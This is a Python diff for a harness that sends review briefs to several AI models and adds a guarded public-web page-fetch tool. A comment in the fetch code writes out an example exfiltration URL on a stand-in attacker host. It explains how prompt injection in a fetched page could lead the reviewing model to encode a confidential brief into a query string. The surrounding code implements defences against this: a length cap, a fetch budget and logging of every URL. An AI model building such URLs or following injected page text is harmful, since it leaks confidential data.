+        addr = info[4][0]
+        try:
+            ip = ipaddress.ip_address(addr.split("%")[0])   # strip IPv6 zone index
+        except ValueError:
+            return "unparseable address %r" % addr
+        if (ip.is_private or ip.is_loopback or ip.is_link_local or ip.is_multicast
+                or ip.is_reserved or ip.is_unspecified):
+            return ("%s resolves to %s, which is not a public address. This tool reaches the "
+                    "public web only." % (host, ip))
+    return None
+
+
+def _safe_fetch_url(url, timeout=25):
+    """Fetch a public web page as text, or return a string explaining why not.
+
+    Never raises: a tool call that throws would abort a review that has already been paid for.
+    The model is TOLD the failure, in words, and can decide to search again or say it could not
+    open the page - which is exactly the behaviour the brief already asks for.
+    """
+    import html as _html
+    seen = 0
+    try:
+        while True:
+            parts = urllib.parse.urlsplit(url)
+            if parts.scheme not in ("http", "https"):
+                return "REFUSED: scheme %r is not allowed; only http and https." % parts.scheme
+            # 🔴 THIS TOOL IS AN EXFILTRATION CHANNEL AND THE FENCE ABOVE DOES NOTHING ABOUT IT.
+            # Raised independently by kimi and qwen reviewing this very change, both proposing the
+            # same shape: `https://attacker.example/r?d=<base64 of the brief>`. That host is
+            # public, so every check above passes it. The brief can be confidential, and the model
+            # choosing the URL is reasoning about untrusted text that may carry injected
+            # instructions - so this does not require a malicious model, only a poisoned page.
+            # Not solvable here: a query string is how the legitimate web works. What IS done -
+            # a length cap bounds how much can ride on one request, the fetch budget bounds the
+            # number of requests, and EVERY fetched URL is printed to the console and recorded in
+            # diagnostics.json, so the attempt is visible rather than silent. Residual risk,
+            # accepted knowingly, not closed.
+            if len(url) > 2000:
+                return ("REFUSED: URL is %d characters. Real page URLs are short; a long one is "
+                        "usually data being smuggled into a query string. Fetch the page, do not "
+                        "encode content into the address." % len(url))
+            bad = _fetch_guard_host(parts.hostname)
+            if bad:
+                return "REFUSED: " + bad
+            req = urllib.request.Request(url, headers={
+                "User-Agent": "Mozilla/5.0 (compatible; model-orchestration review harness)",
+                "Accept": "text/html,application/xhtml+xml,text/plain,application/pdf;q=0.8"})
+            opener = urllib.request.build_opener(_NoRedirect())
+            try:
+                resp = opener.open(req, timeout=timeout)
+            except urllib.error.HTTPError as e:
+                if e.code in (301, 302, 303, 307, 308) and seen < FETCH_MAX_REDIRECTS:
+                    nxt = e.headers.get("Location")
+                    if not nxt:
+                        return "HTTP %s with no Location header." % e.code
+                    url = urllib.parse.urljoin(url, nxt)   # re-guarded at the top of the loop
+                    seen += 1
+                    continue
+                return "HTTP %s fetching %s" % (e.code, url)
+            with resp:
+                ctype = (resp.headers.get("Content-Type") or "").lower()
+                raw = resp.read(FETCH_MAX_BYTES + 1)
+            break
+    except Exception as e:
+        return "could not fetch %s: %r" % (url, e)
+    truncated = len(raw) > FETCH_MAX_BYTES
+    raw = raw[:FETCH_MAX_BYTES]
+    if "application/pdf" in ctype or raw[:5] == b"%PDF-":
+        return ("REFUSED: %s is a PDF. This tool returns text only - cite it as [SNIPPET] or "
+                "find an HTML rendering." % url)
+    body = raw.decode("utf-8", "replace")
+    if "html" in ctype or body.lstrip()[:1] == "<":
+        body = re.sub(r"(?is)<(script|style|noscript|svg)\b.*?</\1>", " ", body)
+        body = re.sub(r"(?s)<!--.*?-->", " ", body)
+        body = re.sub(r"(?s)<[^>]+>", " ", body)
+        body = _html.unescape(body)
+    body = re.sub(r"[ \t\r\f\v]+", " ", body)
+    body = re.sub(r"\n\s*\n\s*\n+", "\n\n", body).strip()
+    if truncated:
+        body += "\n\n[TRUNCATED at %d bytes - fetch a more specific URL if you need the rest]" \
+                % FETCH_MAX_BYTES
+    return body or "(the page returned no readable text)"
+
+
+class _NoRedirect(urllib.request.HTTPRedirectHandler):
+    """Turn redirects into HTTPError so _safe_fetch_url re-guards every hop itself."""
+
+    def redirect_request(self, req, fp, code, msg, headers, newurl):
+        return None
+
+
+def call_openrouter_reviewer(brief, marker, outfile, model=None, system=None, timeout=2400,
+                             web=None, name="kimi", reasoning=None, max_tokens=None,
+                             fetch_tool=None):
+    """
+    Any OpenRouter model over the OpenAI-style /chat/completions, DIRECTLY - no CLI in between.
+
+    Renamed from `call_kimi_openrouter` on 2026-08-06 when Qwen joined: a function named for one
+    of the several channels it serves is the same instance-not-class mistake that left
+    `channels.spark.model` decorative for weeks, and it is the reason the reporting layer was
+    still testing `name == "kimi"` long after that stopped meaning "the OpenRouter channel".
+
+    Why Hermes was demoted (all of this measured 2026-08-03, none of it recalled): Hermes
+    routes `moonshotai/*` through OpenRouter with the SAME OPENROUTER_API_KEY that sits in this
+    machine's environment - its own config.yaml names that variable and it keeps
+    `cache/openrouter_model_metadata.json`. So the CLI was a second layer over the same billing,
+    and the layer is what failed: 2x2400s timeouts on a 13.5KB strategic brief with zero output
+    (T52 corpus-rule panel), an agentic tool surface that had to be fenced (`-t web`,
+    `--ignore-rules`, neutral cwd), a Windows argv ceiling on the prompt, and exit 0 on
+    provider errors. The direct call has none of those: no argv limit, no tool surface at all,
+    per-call token usage in the response, and OpenRouter keeps the stream alive with
+    `: OPENROUTER PROCESSING` comment lines while the model reasons, which removes the
+    idle-drop risk that makes long blocking calls untrustworthy.
+
+    WEB ACCESS, added 2026-08-06 on Igor's instruction («Про интернет я имел ввиду для Qwen и
+    Kimi»). This channel used to be text-only on purpose - pure analysis is where the model
+    earned its seat (T51: strongest finding of the round, derived from control flow with nothing
+    executed). Search is now a registry flag, `channels.kimi.web`, off by setting enabled:false.
+
+    It is sent as a request-level PLUGIN rather than by appending `:online` to the model id.
+    OpenRouter documents the two as exactly equivalent, and the suffix is the worse of the two
+    here for one reason: it hides a billable setting inside the model name, where `--set`, the
+    printed plan and the diagnostics file all read a model and none of them see a search fee.
+    A cost that does not appear in the plan is a cost nobody declined.
+
+    Billing (OpenRouter docs, 2026-08-06): Exa $0.005 per request for up to 10 results, then
+    $0.001 per additional result, on the same account as the tokens. Native provider search is
+    used when the provider supports it; Moonshot is not on OpenRouter's native-search list, so
+    this falls back to Exa.
+    """
+    key = os.environ.get("OPENROUTER_API_KEY")
+    if not key and os.name == "nt":
+        try:
+            import winreg
+            with winreg.OpenKey(winreg.HKEY_CURRENT_USER, "Environment") as reg:
+                key = winreg.QueryValueEx(reg, "OPENROUTER_API_KEY")[0]
+        except OSError:
+            pass
+    if not key:
+        # `name`, not a literal. This function serves every openrouter channel, and returning
+        # a hard-coded "kimi" here made a qwen failure report itself as a kimi failure - the same
+        # instance-for-class mistake that this docstring is about, still present three renames on.
+        return {"channel": name, "ok": False,
+                "error": "OPENROUTER_API_KEY is not set - this channel needs it. Set it (see "
+                         "INSTALL.md), or run with --skip %s." % name}
+    model = model or _registry_default(name, "model", "moonshotai/kimi-k3")
+    msgs = []
+    if system:
+        msgs.append({"role": "system", "content": system})
+    msgs.append({"role": "user", "content": brief})
+    # max_tokens covers REASONING + answer on OpenRouter reasoning models. Measured T53: a
+    # strategic brief drove kimi-k3 to 132,471 reasoning chars, which consumed the whole 32,000
+    # budget before one answer token - out_tokens exactly 32000, empty text, no marker. So the
+    # ceiling is high and reasoning is capped explicitly, leaving guaranteed answer room.
+    #
+    # Both knobs come from the registry now, because the two models on this transport need
+    # different ones: kimi takes `reasoning.max_tokens` (an explicit cap), qwen3.8-max has
+    # `reasoning.mandatory: true` and is steered by `effort` instead. A recommendation to cut
+    # qwen to effort=high, on the documented theory that xhigh RESERVES 95% of max_tokens and
+    # starves the answer, was tested before it was believed: four arms at a deliberately tiny
+    # 2000-token ceiling, including the arm predicted to fail, all returned a complete answer
+    # with the end marker. The ratio is a ceiling, not a reservation - so the mitigation is a
+    # generous max_tokens, and depth is not traded away for a mechanism nothing demonstrated.
+    body = {"model": model, "messages": msgs,
+            "max_tokens": max_tokens or 64000,
+            "reasoning": dict(reasoning) if reasoning else {"max_tokens": 24000},
+            "stream": True, "usage": {"include": True}}
+    if (web or {}).get("enabled"):
+        plug = {"id": "web"}
+        for k in ("engine", "max_results", "search_prompt"):
+            if web.get(k) is not None:
+                plug[k] = web[k]
+        body["plugins"] = [plug]
+        log("  [%s] web search ON (%s, max %s results) - billed per search by the provider"
+            % (name, plug.get("engine", "provider default"),
+               plug.get("max_results", "provider default")))
+    # 🔴 A PAGE-FETCH TOOL, alongside search rather than instead of it. Igor, 2026-08-07: «я думал,
+    # ты так же добавишь им инструмент открытия сайта, типа Scrape, как дополнительный инструмент
+    # к нативному». He is identifying the exact hole the registry already documented and had left
+    # open: the Exa plugin returns 2-4 KB of query-selected EXCERPTS per URL with `[...]` elision
+    # markers, so these two channels could be CURRENT but never GROUNDED, and a verbatim quotation
+    # from them could splice two disjoint fragments into a sentence no page ever contained. Kimi
+    # said so itself in a live round: «I did not have a working page-fetch tool on this channel,
+    # so nothing here is [OPENED].»
+    #
+    # The second payoff is telemetry, and it is arguably the larger one. WE execute the fetch, so
+    # for these channels "which URLs did it actually open" stops being an inference and becomes a
+    # list - the grounding evidence Codex structurally cannot provide.
+    ft = fetch_tool if fetch_tool is not None else {"enabled": True}
+    fetch_on = bool((ft or {}).get("enabled"))
+    max_rounds = int((ft or {}).get("max_calls") or 8)
+    if fetch_on:
+        body["tools"] = [FETCH_TOOL_SCHEMA]
+        log("  [%s] page-fetch tool ON (up to %d fetches, public web only, %d KB per page)"
+            % (name, max_rounds, FETCH_MAX_BYTES // 1000))
+    headers = {"Authorization": "Bearer " + key,
+               "Content-Type": "application/json",
+               # OpenRouter's optional attribution headers. Static strings, no PII.
+               "HTTP-Referer": "https://github.com/igorsaevets/ai-second-opinion",
+               "X-Title": "model-orchestration"}
+
+    def _stream_once(payload):
+        """One streaming completion. Returns (text, reasoning_chars, usage, tool_calls) or raises.
+
+        Tool calls arrive as DELTAS keyed by `index`, with `function.arguments` split across an
+        arbitrary number of chunks - assembling them by concatenation per index is the only
+        correct reading, and treating any single chunk as a whole call yields JSON that almost
+        parses, which is worse than JSON that does not.
+        """
+        rq = urllib.request.Request(OPENROUTER_URL,
+                                    data=json.dumps(payload).encode("utf-8"), headers=headers)
+        parts, rchars, use, calls = [], 0, {}, {}
+        with urllib.request.urlopen(rq, timeout=timeout) as resp:
+            for raw in resp:
+                line = raw.decode("utf-8", "replace").strip()
+                if not line or line.startswith(":"):    # ": OPENROUTER PROCESSING" keep-alive
+                    continue
+                if not line.startswith("data:"):
+                    continue
+                data = line[5:].strip()
+                if data == "[DONE]":
+                    break
+                try:
+                    ev = json.loads(data)
+                except ValueError:
+                    continue
+                if ev.get("usage"):
+                    use = ev["usage"]
+                for ch in ev.get("choices") or []:
+                    delta = ch.get("delta") or {}
+                    if delta.get("content"):
+                        parts.append(delta["content"])
+                    # Reasoning deltas are surfaced under a separate key; count, never print.
+                    if delta.get("reasoning"):
+                        rchars += len(delta["reasoning"])
+                    for tc in delta.get("tool_calls") or []:
+                        idx = tc.get("index", 0)
+                        slot = calls.setdefault(idx, {"id": None, "name": None, "args": []})
+                        if tc.get("id"):
+                            slot["id"] = tc["id"]
+                        fn = tc.get("function") or {}
+                        if fn.get("name"):
+                            slot["name"] = fn["name"]
+                        if fn.get("arguments"):
+                            slot["args"].append(fn["arguments"])
+        return ("".join(parts), rchars,  use,
+                [{"id": v["id"], "name": v["name"], "args": "".join(v["args"])}
+                 for _, v in sorted(calls.items())])
+
+    text_parts, reasoning_chars, usage = [], 0, {}
+    opened, fetch_failures, fetches = [], [], 0
+    tried = {}          # url -> first outcome; a repeat is answered, not re-fetched, not charged
+    in_tot = out_tot = 0
+    start = time.time()
+    try:
+        for _round in range(max_rounds + 1):
+            chunk, rch, use, calls = _stream_once(body)
+            reasoning_chars += rch
+            in_tot += (use or {}).get("prompt_tokens") or 0
+            out_tot += (use or {}).get("completion_tokens") or 0
+            usage = use or usage
+            if chunk:
+                text_parts.append(chunk)
+            if not calls or not fetch_on or fetches >= max_rounds:
+                if calls and fetches >= max_rounds:
+                    log("  [%s] fetch budget of %d reached; asking for the answer as it stands"
+                        % (name, max_rounds))
+                    # Tell the model rather than silently dropping its request: an unanswered
+                    # tool call leaves it waiting for a result that will never arrive, and the
+                    # usual outcome is an empty answer with no marker.
+                    body["messages"].append(
+                        {"role": "assistant",
+                         "content": "", "tool_calls": [
+                             {"id": c["id"] or ("call_%d" % i), "type": "function",
+                              "function": {"name": c["name"] or "fetch_url",
+                                           "arguments": c["args"] or "{}"}}
+                             for i, c in enumerate(calls)]})
+                    for i, c in enumerate(calls):
+                        body["messages"].append(
+                            {"role": "tool", "tool_call_id": c["id"] or ("call_%d" % i),
+                             "content": "REFUSED: the fetch budget for this review is spent. "
+                                        "Answer from what you already have and mark anything "
+                                        "unverified."})
+                    body.pop("tools", None)      # no more tool rounds; force a final answer
+                    continue
+                break
+            body["messages"].append(
+                {"role": "assistant", "content": chunk,
+                 "tool_calls": [{"id": c["id"] or ("call_%d" % i), "type": "function",
+                                 "function": {"name": c["name"] or "fetch_url",
+                                              "arguments": c["args"] or "{}"}}
+                                for i, c in enumerate(calls)]})
+            for i, c in enumerate(calls):
+                try:
+                    args = json.loads(c["args"] or "{}")
+                except ValueError:
+                    args = {}
+                url = (args or {}).get("url") or ""
+                if c["name"] != "fetch_url":
+                    result = "REFUSED: unknown tool %r." % c["name"]
+                elif fetches >= max_rounds and url not in tried:
+                    # 🔴 MEASURED: the console printed `fetch 9/8`. The budget was checked once
+                    # per ROUND, but one assistant turn can emit several tool calls, and every
+                    # call in that batch ran. A ceiling tested outside the loop it is meant to
+                    # bound is not a ceiling. Checked per CALL now.
+                    result = ("REFUSED: the fetch budget for this review (%d) is spent. Answer "
+                              "from what you have and mark anything unverified." % max_rounds)
+                elif url in tried:
+                    # 🔴 MEASURED ON THE FIRST LIVE ROUND, 2026-08-07: qwen spent fetches 6, 7 and
+                    # 8 on ONE unreachable URL, re-requesting it verbatim each time. A budget that
+                    # counts attempts rather than distinct pages lets a single broken link consume
+                    # the whole allowance, and the model has no way to know it is repeating itself
+                    # because each refusal looks new. Serve the first outcome again, say plainly
+                    # that this is a repeat, and DO NOT spend a fetch on it.
+                    result = ("ALREADY TRIED THIS URL in this review - here is the same result, "
+                              "and it did not cost you a fetch. Do not request it again; either "
+                              "use a different source or say the page could not be opened.\n\n"
+                              + tried[url])
+                else:
+                    fetches += 1
+                    result = _safe_fetch_url(url)
+                    tried[url] = result[:2000] if len(result) > 2000 else result
+                    failed = result.startswith(("REFUSED:", "HTTP ", "could not fetch"))
+                    if failed:
+                        fetch_failures.append(url)
+                    else:
+                        opened.append(_norm_url(url))
+                    log("  [%s] fetch %d/%d %s -> %s"
+                        % (name, fetches, max_rounds, url[:90],
+                           result[:70] if failed else "%d chars" % len(result)))
+                body["messages"].append({"role": "tool",
+                                         "tool_call_id": c["id"] or ("call_%d" % i),
+                                         "content": result})
+    except urllib.error.HTTPError as e:
+        detail = ""
+        try:
+            detail = e.read().decode("utf-8", "replace")[:300]
+        except Exception:
+            pass
+        return {"channel": name, "ok": False,
+                "error": "HTTP %s from OpenRouter: %s" % (e.code, detail)}
+    except Exception as e:
+        return {"channel": name, "ok": False, "error": "stream failed: %r" % (e,)}
+    secs = time.time() - start
+    # Only the LAST assistant turn is the review. Earlier turns are the model narrating its
+    # tool use ("let me open that page"), and concatenating them would put commentary above the
+    # answer and push the end marker off the last line - which the completion check reads as an
+    # incomplete review.
+    text = text_parts[-1] if text_parts else ""
+    if outfile and text.strip():
+        with open(outfile, "w", encoding="utf-8") as f:
+            f.write(text)
+    warn = []
+    if marker and not text.strip().endswith(marker):
+        warn.append("END MARKER NOT ON LAST LINE - output is partial, do not parse it")
+    if not text.strip():
+        warn.append("EMPTY OUTPUT from stream")
+    refusal = refusal_check(text, marker)
+    if refusal:
+        warn.append(refusal)
+    # Tokens are SUMMED across tool rounds, not taken from the last response. Each round re-sends
+    # the whole conversation, so the final call's prompt_tokens is only the last leg and reading
+    # it as the total under-reports the round - on a fetch-heavy review, by most of the bill.
+    n_cited, grounded, _ung = _cite_check(text, set(opened))
+    return {"channel": name, "ok": not warn, "text": text, "seconds": round(secs, 1),
+            "bytes": len(text.encode("utf-8")), "exit": 0, "model": model,
+            "in_tokens": in_tot or usage.get("prompt_tokens"),
+            "out_tokens": out_tot or usage.get("completion_tokens"),
+            "reasoning_chars": reasoning_chars or None,
+            # Real grounding evidence for a channel that had none: WE ran these fetches, so this
+            # is a list rather than an inference. Codex cannot produce this at all.
+            "fetches": fetches or None,
+            "opened_urls": len(opened) or None,
+            "fetch_failures": len(fetch_failures) or None,
+            "n_cited": n_cited or None,
+            "n_grounded": len(grounded) if opened else None,
+            "warnings": warn}
 
 
 AGY_AGENT = "deep-researcher"   # written into the run's own workspace; see _write_agy_agent
@@ -1158,34 +2075,105 @@ def agy_bin():
     ])
 
 
-def channel_preflight(want, outdir):
+# Every `kind` the dispatcher can launch. ONE home: both main() and channel_preflight() read
+# this, because they used to share a blind spot by construction - each had its own copy of the
+# same five literals, so a kind unknown to one was unknown to the other, and a misspelled kind
+# produced neither a preflight warning nor a result, only a log line that scrolls away.
+KNOWN_KINDS = ("http", "codex", "agy", "openrouter", "hermes")
+
+# The degraded path only. When channels.json cannot be loaded there is no `kind` field to read,
+# so these are the names the harness has used, mapped to what they were. Both the historical
+# spellings and the current registry names are here: this table is consulted exactly when the
+# registry is unreadable, which is the one moment a name cannot be looked up.
+_LEGACY_KINDS = {"http": "http", "spark": "http", "spark11": "http", "spark12": "http",
+                 "spark12cont": "http",
+                 "codex": "codex",
+                 "agy": "agy", "gemini": "agy", "agy31pro": "agy", "agy36flash": "agy",
+                 "kimi": "openrouter", "qwen": "openrouter",
+                 "kimik3": "openrouter", "qwen38max": "openrouter", "hermes": "hermes"}
+
+
+def _legacy_slot(cname):
+    """A plan slot for a channel the registry could not describe: kind only, no model."""
+    return {"kind": _LEGACY_KINDS.get(cname), "model": None, "effort": None,
+            "timeout": None, "web": None, "toolsets": None}
+
+
+def _env_key(varname):
+    """Process env first, then HKCU\\Environment, because `setx` writes only the latter."""
+    v = os.environ.get(varname)
+    if not v and os.name == "nt":
+        try:
+            import winreg
+            with winreg.OpenKey(winreg.HKEY_CURRENT_USER, "Environment") as reg:
+                v = winreg.QueryValueEx(reg, varname)[0]
+        except OSError:
+            pass
+    return v
+
+
+def channel_preflight(want, outdir, kinds=None, plan=None):
     """
     Yield human-readable problems for the channels about to run. Never raises, never blocks:
     a channel that fails here still gets its turn, because a stale check that vetoes a working
     channel is worse than a warning. Never prints a key value - only whether one is present.
+
+    Keyed on `kind`, like dispatch. When it keyed on names, renaming the HTTPS channel from
+    "http" to its registry name "spark" would have silently disabled its API-key check: the
+    preflight would print nothing, which reads as "checked and fine" and is in fact "never
+    looked". The same trap for every channel added later, since a new name is unknown by
+    construction.
     """
-    if "http" in want:
-        key = os.environ.get("MODEL_API_KEY")
-        if not key and os.name == "nt":
-            try:
-                import winreg
-                with winreg.OpenKey(winreg.HKEY_CURRENT_USER, "Environment") as reg:
-                    key = winreg.QueryValueEx(reg, "MODEL_API_KEY")[0]
-            except OSError:
-                pass
+    kinds = kinds or {c: _LEGACY_KINDS.get(c) for c in want}
+    by_kind = {}
+    for c in want:
+        by_kind.setdefault(kinds.get(c), []).append(c)
+
+    # A kind the dispatcher cannot launch is a preflight problem, not a runtime surprise. This
+    # is the check that makes --dry-run able to catch a typo in `kind` before anything is spent.
+    for kind in sorted(k for k in by_kind if k not in KNOWN_KINDS):
+        yield ("%s: channels.json gives kind %r, which cannot be dispatched. These channels will "
+               "NOT run despite showing [RUN ] in the plan. Known kinds: %s."
+               % (", ".join(sorted(by_kind[kind])), kind, ", ".join(KNOWN_KINDS)))
+
+    for c in sorted(by_kind.get("http", [])):
+        # Surfaced HERE, not only mid-run, because a mid-run "NOTE" scrolls past and never
+        # appears in --dry-run - and --dry-run is where someone checks which model is about to
+        # answer. Someone who has driven this channel with MODEL_NAME for months deserves to
+        # learn that it stopped steering BEFORE the round, not in a log line during it.
+        env_model = os.environ.get("MODEL_NAME")
+        reg_model = ((plan or {}).get(c) or {}).get("model")
+        if env_model and reg_model and env_model != reg_model:
+            yield ("%s: MODEL_NAME=%s is set in the environment but the registry names %s, and "
+                   "the REGISTRY WINS for this channel. One process-wide variable cannot address "
+                   "one of several channels on this endpoint. Use --set %s=<model>, or unset "
+                   "MODEL_NAME." % (c, env_model, reg_model, c))
+        key = _env_key("MODEL_API_KEY")
         if not key:
-            yield ("http: MODEL_API_KEY is not set (process env or HKCU\\Environment). This "
-                   "channel will fail. Set it, or run with --skip spark.")
+            yield ("%s: MODEL_API_KEY is not set (process env or HKCU\\Environment). This "
+                   "channel will fail. Set it, or run with --skip %s." % (c, c))
         else:
-            yield "http: key present (len %d), endpoint %s" % (
-                len(key), os.environ.get("MODEL_API_BASE", "https://api.meta.ai/v1"))
-    for name, resolver in (("codex", codex_bin), ("agy", agy_bin), ("kimi", hermes_bin)):
-        if name not in want:
-            continue
-        b = resolver()
-        if not (os.path.isfile(b) or shutil.which(b)):
-            yield "%s: binary not found (%s). Install it or exclude the channel." % (name, b)
-    if "agy" in want:
+            yield "%s: key present (len %d), endpoint %s" % (
+                c, len(key), os.environ.get("MODEL_API_BASE", "https://api.meta.ai/v1"))
+    for kind, resolver in (("codex", codex_bin), ("agy", agy_bin), ("hermes", hermes_bin)):
+        for c in sorted(by_kind.get(kind, [])):
+            b = resolver()
+            if not (os.path.isfile(b) or shutil.which(b)):
+                yield "%s: binary not found (%s). Install it or exclude the channel." % (c, b)
+    for c in sorted(by_kind.get("codex", [])):
+        quota = codex_quota_snapshot()
+        if quota:
+            yield "%s: %s" % (c, quota)
+    for c in sorted(by_kind.get("openrouter", [])):
+        # Direct OpenRouter since 2026-08-03; the binary check moved to a key check. The Hermes
+        # fallback path still exists behind kind:"hermes", and ITS preflight is the binary.
+        k = _env_key("OPENROUTER_API_KEY")
+        if not k:
+            yield ("%s: OPENROUTER_API_KEY is not set. The direct channel will fail; set it "
+                   "or exclude the channel." % c)
+        else:
+            yield "%s: OpenRouter key present (len %d), direct /chat/completions" % (c, len(k))
+    if by_kind.get("agy"):
         problem = agy_permission_preflight()
         if problem:
             yield "agy: " + problem
@@ -1217,13 +2205,41 @@ def _write_agy_agent(workdir):
     return d
 
 
-_URL_RE = re.compile(r"https?://[^\s)\]>\"'`|]+")
+# `]` is excluded so a markdown link `[label](url)` does not swallow the closing bracket. 🔴 That
+# same exclusion TRUNCATES a bracketed IPv6 URL: `http://[::1]/` matches as `http://[::1`, whose
+# netloc has an opening bracket and no closing one - which is precisely what urlsplit rejects. So
+# the bracketed-host form is matched by its own branch FIRST, before the general one.
+_URL_RE = re.compile(r"https?://\[[0-9A-Fa-f:.]+\][^\s)\]>\"'`|]*"
+                     r"|https?://[^\s)\]>\"'`|]+")
 
 
 def _norm_url(u):
-    """host+path, lowercased, no www and no trailing slash: tracking params are not differences."""
-    s = urlsplit(u.rstrip(".,;:"))
-    return (s.netloc.lower().replace("www.", ""), (s.path or "/").rstrip("/").lower())
+    """host+path, lowercased, no www and no trailing slash: tracking params are not differences.
+
+    🔴 THIS FUNCTION MUST NEVER RAISE, and until 2026-08-07 it could. Measured live, on the round
+    reviewing this harness's own SSRF fence: both Spark channels died with
+    `ValueError('Invalid IPv6 URL')` and were RETRIED IN FULL - two extra paid streaming calls -
+    because the reviews discussed the fence and therefore contained `http://[::1]/`.
+
+    The chain is worth keeping because nothing in it looks dangerous alone: a URL regex written to
+    play nicely with markdown truncates a bracketed host; `urlsplit` correctly rejects the
+    truncation; the citation check has no guard; and the caller's `except Exception` reports the
+    whole thing as a TRANSPORT failure and retries the network call. A parsing bug in the
+    verification layer was thus billed as a network problem, three times, and the log line named
+    the wrong subsystem.
+
+    Generalisation: an accounting or verification helper that runs AFTER a paid call must not be
+    able to fail that call. Wrap it, or the cheapest layer in the system decides what the most
+    expensive one costs.
+    """
+    u = u.rstrip(".,;:")
+    try:
+        s = urlsplit(u)
+        return (s.netloc.lower().replace("www.", ""), (s.path or "/").rstrip("/").lower())
+    except ValueError:
+        rest = u.split("://", 1)[-1]
+        host, _slash, path = rest.partition("/")
+        return (host.lower().replace("www.", ""), ("/" + path).rstrip("/").lower())
 
 
 def _cite_check(text, opened):
@@ -1263,9 +2279,10 @@ def _parse_agy_stream(path):
     Indexing ev["type"] silently matches nothing on every line, which is indistinguishable from
     a model that did no work at all.
     """
-    out = {"tools": {}, "denied": {}, "errors": [], "text": "", "status": None,
+    out = {"tools": {}, "denied": {}, "tool_errors": {}, "errors": [], "text": "", "status": None,
            "thinking": None, "out_tokens": None, "turns": None, "seconds": None,
-           "perm_mode": None, "opened": set(), "queries": 0}
+           "perm_mode": None, "opened": set(), "queries": 0, "result_error": None,
+           "last_tool": None}
     if not os.path.exists(path):
         return out
     with open(path, encoding="utf-8", errors="replace") as f:
@@ -1285,6 +2302,15 @@ def _parse_agy_stream(path):
             if kind == "result":
                 out["text"] = body.get("response") or ""
                 out["status"] = body.get("status")
+                # 🔴 2026-08-07: THIS FIELD WAS IN THE FILE ALL ALONG AND NOBODY READ IT. The
+                # round-25 agy36flash failure reported only "END MARKER ABSENT - output is
+                # incomplete", whose suggested fix is "re-run that channel alone, or lower
+                # --tier" - advice that would not have helped, because the run did not time out.
+                # The result frame said, verbatim, `"error": "Agent execution terminated due to
+                # error."` after 39 tool calls and 8,145 output tokens. Parsing the response and
+                # the status while dropping the field that says WHY is how a diagnosis gets
+                # replaced by a symptom.
+                out["result_error"] = body.get("error")
                 u = body.get("usage") or {}
                 out["thinking"] = u.get("thinking_tokens")
                 out["out_tokens"] = u.get("output_tokens")
@@ -1307,7 +2333,25 @@ def _parse_agy_stream(path):
                 if p.get("query") or p.get("Query") or p.get("search_term"):
                     out["queries"] += 1
             if body.get("state") == "ERROR" or err:
-                out["denied"][name] = out["denied"].get(name, 0) + 1
+                # 🔴 2026-08-07: THIS BUCKET USED TO BE CALLED `denied` FOR EVERY KIND OF FAILURE,
+                # AND THE NAME IS THE WHOLE PROBLEM. In this channel `denied` has one specific,
+                # documented meaning - a permission the headless run cannot prompt for, which
+                # DISCARDS THE ENTIRE RUN. So `denied=1` on the console is read as "the permission
+                # bug bit again" and sends the reader to patch_agy_permissions.py.
+                #
+                # Measured on the round-25 agy36flash failure: the single counted "denial" was a
+                # 30-second fetch timeout on ecfr.gov (TOOL_ERROR, «Failed to fetch document
+                # content»). Nothing was denied. The real terminal event was an `error_message`
+                # step and `Agent execution terminated due to error` - a different failure with a
+                # different fix, hidden behind a counter that had confidently named the wrong one.
+                #
+                # A counter is an assertion about CAUSE. Naming it after the interesting cause and
+                # then feeding it every cause is how an instrument starts lying while still
+                # counting correctly - the same shape as the `if name == "http"` reporting bug,
+                # one level down: there the number vanished, here the number is right and its
+                # LABEL is wrong, which is worse because it still looks like evidence.
+                bucket = "denied" if "denied permission" in (err or "").lower() else "tool_errors"
+                out[bucket][name] = out[bucket].get(name, 0) + 1
                 if err and err not in out["errors"]:
                     out["errors"].append(err)
             else:
@@ -1478,7 +2522,23 @@ def _agy_once(brief, marker, workdir, outfile, model=None, effort="high", timeou
                     "--dangerously-skip-permissions: that also unlocks firecrawl_crawl."
                     % (denial[0] if denial else "see stderr"))
     if marker and marker not in text:
-        warn.append("END MARKER ABSENT - output is incomplete, do not parse it as a review")
+        # 🔴 SAY WHY, NOT JUST WHAT. Until 2026-08-07 this was the whole message, and its stock
+        # advice ("re-run alone, or lower --tier") pointed at a timeout. The round-25 agy36flash
+        # failure was not a timeout: it died at 84 seconds having ALREADY produced 8,145 output
+        # tokens across 39 tool calls, and the result frame carried its own explanation. An
+        # incomplete-output warning that describes only the incompleteness sends every reader to
+        # re-run the same failure.
+        why = ""
+        if ev.get("result_error"):
+            why = " CAUSE (from the channel's own result frame): %r." % ev["result_error"]
+            if not text.strip():
+                why += (" It discarded a run it had already done the work for - %s output tokens "
+                        "over %s tool calls came back as an EMPTY answer, so re-running at a "
+                        "lower tier would not have helped."
+                        % (ev.get("out_tokens"), sum(ev["tools"].values())))
+        elif ev["errors"]:
+            why = " Last tool error seen: %r." % ev["errors"][-1]
+        warn.append("END MARKER ABSENT - output is incomplete, do not parse it as a review." + why)
     refusal = refusal_check(text, marker, min_chars=500)
     if refusal:
         warn.append(refusal + " Never validate this channel on the exit code or the status field.")
@@ -1509,7 +2569,10 @@ def _agy_once(brief, marker, workdir, outfile, model=None, effort="high", timeou
     return {"channel": "agy", "ok": not warn, "text": text, "seconds": round(secs, 1),
             "bytes": len(text.encode("utf-8")), "exit": p.returncode, "warnings": warn,
             "notes": note, "tool_calls": sum(ev["tools"].values()), "searches": searches,
-            "denied": sum(ev["denied"].values()), "thinking": ev["thinking"],
+            "denied": sum(ev["denied"].values()),
+            # Split from `denied` on 2026-08-07. A failed fetch and a refused permission need
+            # different fixes and used to share one counter under the scarier name.
+            "tool_errors": sum(ev["tool_errors"].values()), "thinking": ev["thinking"],
             "out_tokens": ev["out_tokens"], "agy_status": ev["status"],
             "perm_mode": ev["perm_mode"], "events": ndjson,
             # Machine-readable so the retry wrapper below does not have to re-parse prose.
@@ -1640,27 +2703,33 @@ def main():
         return gate
 
     if plan:
+        # Registry names only. This used to also inject the internal alias "http" whenever
+        # "spark" was selected, because dispatch matched on that literal. With dispatch keyed on
+        # `kind` the alias is not merely unnecessary, it is harmful: "http" would resolve through
+        # the legacy table to kind http and launch a THIRD copy of the same endpoint, paid for
+        # and reported under a name no registry entry owns.
         want = {c for c, p in plan.items() if p["enabled"]}
-        if "spark" in want:                      # "spark" is the registry name for the HTTPS channel
-            want.add("http")
     else:
         # Registry unavailable: no alias table, so accept both spellings by hand rather than
         # letting the degraded path reintroduce the `--only http` failure the router just fixed.
-        want = {"spark": "http", "gemini": "agy", "hermes": "kimi"}.get
